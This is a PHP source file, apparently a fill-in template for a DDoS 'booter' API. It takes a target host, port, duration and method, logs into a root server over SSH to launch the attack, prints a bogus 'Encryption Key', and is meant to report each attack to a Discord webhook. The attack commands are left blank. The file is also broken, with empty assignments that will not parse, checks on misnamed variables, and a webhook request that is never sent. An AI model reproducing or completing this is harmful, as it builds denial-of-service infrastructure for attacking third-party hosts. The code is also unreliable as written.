<?php

##############################################
#					     #					
# 		By Void		             #				
#					     # 						
# https://github.com/Protocol1337            #
##############################################

ignore_user_abort(true);
set_time_limit("enter the time limit here");
$min = ;
$max = ;
$number = rand($min, $max);
$min1 = ;
$max1 = ;
$number1 = rand($min1, $max1);
$min2 = ;
$max2 = ;
$number2 = rand($min2, $max2);
$min3 = ;
$max3 = ;
$number3 = rand($min3, $max3);
$maxtime = ;
$servers = "";
$server_ip = "Serverip"; //this is your server ip
$server_user = "root";// this is ur server username (dont change unless u have a different login with full perms as root)
$server_pass = "Password123"; //this is ur pass that u login to ur root server with
$key = $_GET['key'];
$host = $_GET['host'];
$port = intval($_GET['port']);
$time = intval($_GET['time']);
$method = $_GET['method'];
$array = array("","","","","","","","","","","","","","T","","","","");
$ray = array("key", "", ""); //keys
if (!empty($key)){
}else{
die('API Key Is Empty!');}
if (in_array($key, $ray)){
}else{
die('Invalid API Key!');}
if (!empty($time)){
}else{
die('Time Is Empty!');}
if (!empty($host)){
}else{
die('Host Is Empty!');}
if (!empty($method)){
}else{
die('Method Is Empty!');}
if (in_array($method, $array)){
}else{
die('Method Is Invalid!');}
if ($port > 65500){
die('65500 Is The Max Port!');}
if ($time < 10){
die('Please Send An Attack Over 10 Seconds!');}
if ($time > $maxtime){
die('$maxtime Is Your Max Time!');}
if(ctype_digit($Time)){
die('Ports Must Be In A Numeric Form!');}
if(ctype_digit($Port)){
die('Port Is Not In Numeric Form!');}
if ($method == "") { $command = ""; }
if ($method == "") { $command = ""; }
if ($method == "") { $command = ""; }
if ($method == "") { $command = ""; }
if ($method == "") { $command = ""; }
if ($method == "") { $command = ""; }
if ($method == "") { $command = ""; }
if ($method == "") { $command = ""; }
if ($method == "") { $command = ""; }
if ($method == "") { $command = ""; }
if ($method == "") { $command = ""; }
if ($method == "") { $command = ""; }
if ($method == "") { $command = ""; }
if ($method == "") { $command = ""; }
if ($method == "") { $command = ""; }
if ($method == "") { $command = ""; }
if ($method == "") { $command = ""; }
if ($method == "") { $command = ""; }
if ($method == "") { $command = ""; }
if ($method == "") { $command = ""; }
if (!function_exists("ssh2_connect")) die("Error: SSH2 does not exist on your server");
if(!($con = ssh2_connect($server_ip, 22))){
  echo "Error: Connection Issue";
} else {
    if(!ssh2_auth_password($con, $server_user, $server_pass)) {
    echo "contact admin";
    } else {

        if (!($stream = ssh2_exec($con, $command ))) {
            echo "failed to execute";
        } else {
            stream_set_blocking($stream, false);
            $data = "";
            while ($buf = fread($stream,4096)) {
                $data .= $buf;
            }
            echo "Attack Started On $host:$port With Servers: $servers</br> Sent With $number Threads! </br>Encryption Key: {Status: Success, Encryption Key = #$number$number1$number2#-!~*#134$number3}.</br></br> <h2>API Made By Void.#1337 -> Protocol1337.</h2>";
            fclose($stream);

            $webhookdata = [];
            $timestamp = new \DateTime();
            $timestamp->setTimezone(new \DateTimeZone("UTC"));
            $webhookdata['embeds'][] = [
                'title' => "",
                'color' => 0xd91133,
                'timestamp' => $timestamp->format("Y-m-d\TH:i:s.v\Z"),
                'description' => "Attack Sent To $host, Port: $port, Time: $time, Method: $method, Key: $key",
                'footer' => [
                    "text" => ""
                ]
            ];
            $ch = curl_init("https://discordapp.com/api/webhooks/YOUR WEBHOOK URL");
            curl_setopt_array($ch, [
                CURLOPT_POST => true,
                CURLOPT_POSTFIELDS => json_encode($webhookdata),
                CURLOPT_SSL_VERIFYPEER => false,
                CURLOPT_SSL_VERIFYHOST => 2,
                CURLOPT_FORBID_REUSE => 1,
                CURLOPT_FRESH_CONNECT => 1,
                CURLOPT_AUTOREFERER => true,
                CURLOPT_FOLLOWLOCATION => true,
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_CONNECTTIMEOUT_MS => (int)(2 * 1000),
                CURLOPT_TIMEOUT_MS => (int)(2 * 1000),
                CURLOPT_HTTPHEADER => ["Content-Type: application/json"],
                CURLOPT_HEADER => true
            ]);
            curl_close($ch);
        }

    }
}
?>
